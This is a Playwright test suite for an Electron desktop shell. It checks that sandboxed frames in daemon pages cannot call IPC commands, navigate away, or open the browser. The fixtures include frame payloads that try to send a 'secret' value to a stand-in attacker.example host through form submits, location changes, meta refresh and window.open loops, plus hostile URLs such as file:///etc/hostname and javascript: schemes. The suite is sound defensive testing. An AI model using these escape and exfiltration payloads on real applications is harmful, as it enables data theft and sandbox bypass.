// No frame of a daemon page can make the Electron shell call a command, see
// its declaration, leave the app or open the browser, and the page's own
// links and commands still work (README "Checking navigation"). The mock
// daemon serves each case's page with the daemon's Content-Security-Policy
// or with none, as Vite's development server sends none, so nothing but the
// shell stops a frame. Clicks are real pointer input.
import { expect, test } from "@playwright/test";
import {
  BIG,
  DAEMON_CSP,
  FRAME_CSP,
  invoke,
  launch,
  MockDaemon,
  Server,
  type Shell,
  sleep,
  waitFor,
} from "./harness.ts";

const daemon = new MockDaemon();
/** Another site: `attacker.example`, resolved to 127.0.0.1. */
const attacker = new Server();
/** Another local server, such as a stale daemon address. */
const loopback = new Server();
let shell: Shell;

const att = (query: string) => `http://attacker.example:${attacker.port}/?case=${query}&d=secret`;
const later = (js: string) => `<script>setTimeout(()=>{${js}},300)</script>`;

/** The pages a case serves: the daemon page, with or without the daemon's
 *  policy, holding a sandboxed frame (or `main` instead). */
interface Case {
  name: string;
  policy: boolean;
  frame?: () => string;
  frameCsp?: string;
  main?: () => string;
  /** A real click in the middle of the window once the page has loaded. */
  click?: boolean;
}

function serve(c: Case): string {
  const frame = `/s/ns/frame/${c.name}`;
  daemon.pages.set(`/s/ns/case/${c.name}`, () => ({
    csp: c.policy ? DAEMON_CSP : undefined,
    body: `<!doctype html><meta charset="utf-8"><body style="margin:0">${
      c.main?.() ??
      `<iframe sandbox="allow-scripts" style="${BIG}" src="${frame}"></iframe><script src="/s/ns/relay.js"></script>`
    }</body>`,
  }));
  if (c.frame) {
    const body = c.frame;
    daemon.pages.set(frame, () => ({
      csp: c.frameCsp ?? FRAME_CSP,
      body: `<!doctype html><meta charset="utf-8"><body style="margin:0">${body()}</body>`,
    }));
  }
  return daemon.url(`case/${c.name}`);
}

/** Shows a case's page; resolves once its frame (if any) has loaded. */
async function show(c: Case): Promise<{ url: string; logs: number; opened: number }> {
  const url = serve(c);
  attacker.requests.length = 0;
  loopback.requests.length = 0;
  const logs = shell.logs.length;
  const opened = (await shell.opened()).length;
  const before = daemon.requests.length;
  await shell.main.goto(url);
  if (c.frame) {
    await waitFor(`the frame of ${c.name}`, 10_000, () =>
      daemon.requests.slice(before).some((r) => r.includes(`/s/ns/frame/${c.name}`)),
    );
  }
  await sleep(500);
  if (c.click) await shell.main.mouse.click(400, 300);
  return { url, logs, opened };
}

/** What the app opened in the browser since `from`. */
const openedSince = async (from: number) => (await shell.opened()).slice(from);

/** What the shell logged since `from`. */
const logsSince = (from: number) => shell.logs.slice(from);

test.beforeAll(async () => {
  await Promise.all([daemon.listen(), attacker.listen(), loopback.listen()]);
  daemon.pages.set("/s/ns/relay.js", {
    type: "text/javascript",
    body: `addEventListener("message", (e) => { (window.__frameMessages ||= []).push(e.data); });`,
  });
  shell = await launch(daemon);
  // The real attach path: the fake baum's status, the credential, the
  // launch page and its redirect into the namespace.
  await shell.main.waitForURL((url) => url.href.startsWith(daemon.url()), { timeout: 60_000 });
});

test.afterAll(async () => {
  await shell?.close();
  await Promise.all([daemon.close(), attacker.close(), loopback.close()]);
});

// A sandboxed frame trying every way to the shell, reporting what it sees to
// the page, and posting a message shaped like a command call.
const IPC_PROBE = () => `<script>(() => {
  const seen = {};
  const t = (k, f) => { try { const v = f(); seen[k] = v === undefined ? "undefined" : String(v); } catch (e) { seen[k] = "throws " + e.name; } };
  t("baumDesktop", () => typeof window.baumDesktop);
  t("__BAUM_DESKTOP__", () => typeof window.__BAUM_DESKTOP__);
  t("parent.baumDesktop", () => typeof parent.baumDesktop);
  t("top.__BAUM_DESKTOP__", () => typeof top.__BAUM_DESKTOP__);
  t("parent invoke", () => parent.baumDesktop.invoke("open_link", { url: ${JSON.stringify(att("ipc"))} }));
  t("require", () => typeof window.require);
  t("process", () => typeof window.process);
  t("ipcRenderer", () => typeof window.ipcRenderer);
  t("electron", () => typeof window.electron);
  const call = { channel: "baum:invoke", name: "open_link", args: { url: ${JSON.stringify(att("message"))} } };
  parent.postMessage(call, "*");
  top.postMessage(call, "*");
  parent.postMessage({ report: seen }, "*");
})()</script>`;

for (const [name, frameCsp] of [
  ["ipc-frame", FRAME_CSP],
  ["ipc-frame-sandbox-only", "sandbox allow-scripts"],
] as const) {
  test(`${name}: a sandboxed frame can call no command and sees no declaration`, async () => {
    const { logs, opened } = await show({ name, policy: true, frame: IPC_PROBE, frameCsp });
    const report = await waitFor("the frame's report", 10_000, () =>
      shell.main.evaluate(
        () =>
          (
            window as { __frameMessages?: { report?: Record<string, string> }[] }
          ).__frameMessages?.find((m) => m.report)?.report,
      ),
    );
    console.log(`${name}: ${JSON.stringify(report)}`);
    expect(report.baumDesktop).toBe("undefined");
    expect(report.__BAUM_DESKTOP__).toBe("undefined");
    for (const key of ["parent.baumDesktop", "top.__BAUM_DESKTOP__", "parent invoke"]) {
      expect(report[key], key).toMatch(/^throws SecurityError/);
    }
    for (const key of ["require", "process", "ipcRenderer", "electron"]) {
      expect(report[key], key).toBe("undefined");
    }

    // The page itself has the bridge and its declaration, which it cannot
    // replace.
    const page = await shell.main.evaluate(() => {
      const w = window as unknown as { __BAUM_DESKTOP__: unknown };
      const declaration = JSON.stringify(w.__BAUM_DESKTOP__);
      const frozen = Object.isFrozen(w.__BAUM_DESKTOP__);
      try {
        w.__BAUM_DESKTOP__ = { tileFrames: false };
      } catch {}
      return { declaration, frozen, after: JSON.stringify(w.__BAUM_DESKTOP__) };
    });
    expect(page).toEqual({
      declaration: '{"tileFrames":true,"checkWindow":true,"openLinks":true}',
      frozen: true,
      after: '{"tileFrames":true,"checkWindow":true,"openLinks":true}',
    });
    expect(await invoke(shell.main, "zoom_state")).toMatch(/^ok /);
    await sleep(1000);
    // Only the page's own call ran; the frame's message reached no command.
    expect(logsSince(logs).filter((l) => /running the \S+ command/.test(l))).toEqual([
      "baum desktop: running the zoom_state command for the daemon-pages",
    ]);
    expect(await openedSince(opened)).toEqual([]);
    expect(attacker.requests).toEqual([]);
  });
}

/** Frames trying to leave or open the browser. `shell`: the navigation
 *  reaches the shell's guard, which logs refusing it (without the daemon's
 *  policy, which otherwise refuses it first); the others are stopped by the
 *  frame's sandbox before the shell is asked. */
const FRAME_CASES: (Case & { shell?: boolean })[] = [
  {
    name: "frame-sets-location",
    policy: true,
    frame: () => later(`location.href=${JSON.stringify(att("a"))}`),
  },
  {
    name: "frame-sets-location-no-policy",
    policy: false,
    shell: true,
    frame: () => later(`location.href=${JSON.stringify(att("b"))}`),
  },
  {
    name: "frame-meta-refresh-no-policy",
    policy: false,
    shell: true,
    frame: () => `<meta http-equiv="refresh" content="0;url=${att("c")}">`,
  },
  {
    name: "frame-loopback-no-policy",
    policy: false,
    shell: true,
    frame: () => later(`location.href="http://127.0.0.1:${loopback.port}/"`),
  },
  {
    name: "frame-link-click",
    policy: true,
    click: true,
    frame: () => `<a style="${BIG}" href="${att("d")}">x</a>`,
  },
  {
    name: "frame-link-click-no-policy",
    policy: false,
    shell: true,
    click: true,
    frame: () => `<a style="${BIG}" href="${att("e")}">x</a>`,
  },
  {
    name: "frame-blank-click-no-policy",
    policy: false,
    click: true,
    frame: () => `<a style="${BIG}" target="_blank" href="${att("f")}">x</a>`,
  },
  {
    name: "frame-top-click-no-policy",
    policy: false,
    click: true,
    frame: () => `<a style="${BIG}" target="_top" href="${att("g")}">x</a>`,
  },
  {
    name: "frame-window-open-click-no-policy",
    policy: false,
    click: true,
    frame: () => `<button style="${BIG}" onclick="open('${att("h")}')">x</button>`,
  },
  {
    name: "frame-window-open-loop-no-policy",
    policy: false,
    click: true,
    frame: () =>
      `<button style="${BIG}" onclick="for (let i = 0; i < 20; i++) open('${att("loop")}' + i)">x</button>` +
      later(`for (let i = 0; i < 20; i++) open(${JSON.stringify(att("loop-script"))} + i)`),
  },
  {
    name: "frame-form-top-no-policy",
    policy: false,
    frame: () =>
      `<form action="http://attacker.example:${attacker.port}/" target="_top"><input name="d" value="secret"></form>` +
      later("document.forms[0].submit()"),
  },
  {
    name: "frame-form-self-no-policy",
    policy: false,
    frame: () =>
      `<form action="http://attacker.example:${attacker.port}/"><input name="d" value="secret"></form>` +
      later("document.forms[0].submit()"),
  },
  {
    name: "frame-nested-frame-no-policy",
    policy: false,
    shell: true,
    // Without the frame's own policy, which otherwise refuses the frame.
    frameCsp: "sandbox allow-scripts",
    frame: () => later(`document.body.innerHTML = '<iframe src="${att("n")}"></iframe>'`),
  },
  {
    name: "page-sets-frame-src-no-policy",
    policy: false,
    shell: true,
    frame: () => "<p>frame",
    main: () =>
      `<iframe id="f" sandbox="allow-scripts" style="${BIG}" src="/s/ns/frame/page-sets-frame-src-no-policy"></iframe>` +
      `<script>setTimeout(() => { document.getElementById("f").src = ${JSON.stringify(att("src"))}; }, 300)</script>`,
  },
];

for (const c of FRAME_CASES) {
  test(`${c.name}: the frame cannot leave or open the browser`, async () => {
    const { url, logs, opened } = await show(c);
    await sleep(1500);
    expect(attacker.requests, "requests that reached another site").toEqual([]);
    expect(loopback.requests, "requests that reached another local server").toEqual([]);
    expect(await openedSince(opened), "links opened in the browser").toEqual([]);
    expect(shell.main.url()).toBe(url);
    const said = logsSince(logs);
    console.log(`${c.name}: ${JSON.stringify(said)}`);
    expect(said.filter((l) => /running the \S+ command/.test(l))).toEqual([]);
    if (c.shell) expect(said.some((l) => /refused a (navigation|frame load)/.test(l))).toBe(true);
  });
}

test("page-link-click: a same-window link to another site is refused", async () => {
  const { url, logs, opened } = await show({
    name: "page-link-click",
    policy: true,
    click: true,
    main: () => `<a style="${BIG}" href="${att("i")}">x</a>`,
  });
  await sleep(1000);
  expect(shell.main.url()).toBe(url);
  expect(attacker.requests).toEqual([]);
  expect(await openedSince(opened)).toEqual([]);
  expect(logsSince(logs)).toContain(
    "baum desktop: refused a navigation to http://attacker.example",
  );
});

test("page-blank-click: the page's own link opens the browser once", async () => {
  await sleep(1100);
  const before = (await shell.opened()).length;
  const { url } = await show({
    name: "page-blank-click",
    policy: true,
    click: true,
    main: () => `<a style="${BIG}" target="_blank" href="${att("j")}">x</a>`,
  });
  await sleep(1000);
  expect((await shell.opened()).slice(before)).toEqual([att("j")]);
  expect(shell.main.url()).toBe(url);
  expect(attacker.requests).toEqual([]);
});

test("page-app-link-click: a link to the daemon's own page navigates", async () => {
  await show({
    name: "page-app-link-click",
    policy: true,
    click: true,
    main: () => `<a style="${BIG}" href="/s/ns/app">x</a>`,
  });
  await shell.main.waitForURL(daemon.url("app"));
});

test("open_link opens the browser, at most once a second", async () => {
  await show({ name: "open-link", policy: true, main: () => "<p>links" });
  await sleep(1100);
  const before = (await shell.opened()).length;
  expect(await invoke(shell.main, "open_link", { url: att("k") })).toBe("ok null");
  // A second link within the second is dropped.
  expect(await invoke(shell.main, "open_link", { url: att("k2") })).toBe("ok null");
  expect((await shell.opened()).slice(before)).toEqual([att("k")]);
  for (const url of [
    "file:///etc/hostname",
    "data:text/html,x",
    "javascript:alert(1)",
    `http://127.0.0.1:${loopback.port}/`,
    `http://user@attacker.example:${attacker.port}/`,
  ]) {
    expect(await invoke(shell.main, "open_link", { url }), url).toMatch(/^error /);
  }
});

test("window.open in a loop opens the browser at most once a second", async () => {
  await show({ name: "window-open-loop", policy: false, main: () => "<p>loop" });
  await sleep(1100);
  const before = (await shell.opened()).length;
  await shell.main.evaluate((url) => {
    for (let i = 0; i < 20; i++) open(`${url}${i}`);
  }, att("burst"));
  await sleep(300);
  expect((await shell.opened()).slice(before)).toEqual([`${att("burst")}0`]);
  // A loop that keeps asking for 2.5 s opens it at most three times.
  await sleep(1100);
  const start = (await shell.opened()).length;
  await shell.main.evaluate(
    (url) =>
      new Promise<void>((done) => {
        let i = 0;
        const timer = setInterval(() => {
          open(`${url}${i++}`);
          if (i === 25) {
            clearInterval(timer);
            done();
          }
        }, 100);
      }),
    att("steady"),
  );
  const steady = (await shell.opened()).length - start;
  console.log(`window.open every 100 ms for 2.5 s opened the browser ${steady} times`);
  expect(steady).toBeGreaterThanOrEqual(2);
  expect(steady).toBeLessThanOrEqual(3);
  // New windows the shell never opens in the browser.
  await sleep(1100);
  const refused = (await shell.opened()).length;
  for (const url of [
    "javascript:alert(1)",
    "file:///etc/hostname",
    "data:text/html,x",
    `http://127.0.0.1:${loopback.port}/`,
    `${daemon.origin}/s/ns/`,
    `http://user@attacker.example:${attacker.port}/`,
  ]) {
    await shell.main.evaluate((u) => void open(u), url);
    await sleep(1100);
  }
  expect((await shell.opened()).slice(refused)).toEqual([]);
  expect(attacker.requests).toEqual([]);
  expect(loopback.requests).toEqual([]);
});

test("the main frame cannot navigate to another site or scheme", async () => {
  const { url, opened } = await show({ name: "main-frame", policy: false, main: () => "<p>main" });
  for (const target of [
    att("main"),
    `http://127.0.0.1:${loopback.port}/`,
    "file:///etc/hostname",
    "data:text/html,<p>data",
    `http://127.0.0.1:${daemon.port}@attacker.example:${attacker.port}/`,
    `http://user@127.0.0.1:${daemon.port}/s/ns/`,
  ]) {
    await shell.main.evaluate((t) => {
      location.href = t;
    }, target);
    await sleep(700);
    expect(shell.main.url(), target).toBe(url);
  }
  // A javascript: URL runs in the page and navigates nowhere.
  await shell.main.evaluate(() => {
    location.href = "javascript:void 0";
  });
  await sleep(300);
  expect(shell.main.url()).toBe(url);
  expect(attacker.requests).toEqual([]);
  expect(loopback.requests).toEqual([]);
  expect(await openedSince(opened)).toEqual([]);
});

test("the network check alone refuses a frame load", async () => {
  // The guard's second check (windows.ts's `guardFrameRequests`), with the
  // first, `will-frame-navigate`, taken away for the test: a frame
  // navigating itself and a frame the page inserts.
  const c: Case = {
    name: "network-check",
    policy: false,
    frame: () => later(`location.href=${JSON.stringify(att("network"))}`),
    frameCsp: "sandbox allow-scripts",
    main: () =>
      `<iframe sandbox="allow-scripts" style="${BIG}" src="/s/ns/frame/network-check"></iframe>` +
      `<script>setTimeout(() => document.body.insertAdjacentHTML("beforeend", '<iframe src="${att("inserted")}"></iframe>'), 300)</script>`,
  };
  const url = serve(c);
  await shell.main.goto(url);
  const removed = await shell.app.evaluate(({ webContents }, url) => {
    const contents = webContents.getAllWebContents().find((w) => w.getURL() === url);
    if (!contents) return 0;
    const listeners = contents.listeners("will-frame-navigate");
    (globalThis as { __frameListeners?: unknown[] }).__frameListeners = listeners;
    contents.removeAllListeners("will-frame-navigate");
    return listeners.length;
  }, url);
  expect(removed).toBeGreaterThan(0);
  try {
    attacker.requests.length = 0;
    const logs = shell.logs.length;
    const opened = (await shell.opened()).length;
    await shell.main.reload();
    await sleep(2000);
    const said = logsSince(logs);
    console.log(`network-check: ${JSON.stringify(said)}`);
    expect(attacker.requests).toEqual([]);
    expect((await shell.opened()).slice(opened)).toEqual([]);
    expect(said.filter((l) => l.includes("refused a frame load")).length).toBeGreaterThanOrEqual(2);
  } finally {
    await shell.app.evaluate(({ webContents }, url) => {
      const contents = webContents.getAllWebContents().find((w) => w.getURL() === url);
      const saved = (globalThis as { __frameListeners?: unknown[] }).__frameListeners ?? [];
      for (const listener of saved) contents?.on("will-frame-navigate", listener as () => void);
    }, url);
  }
});
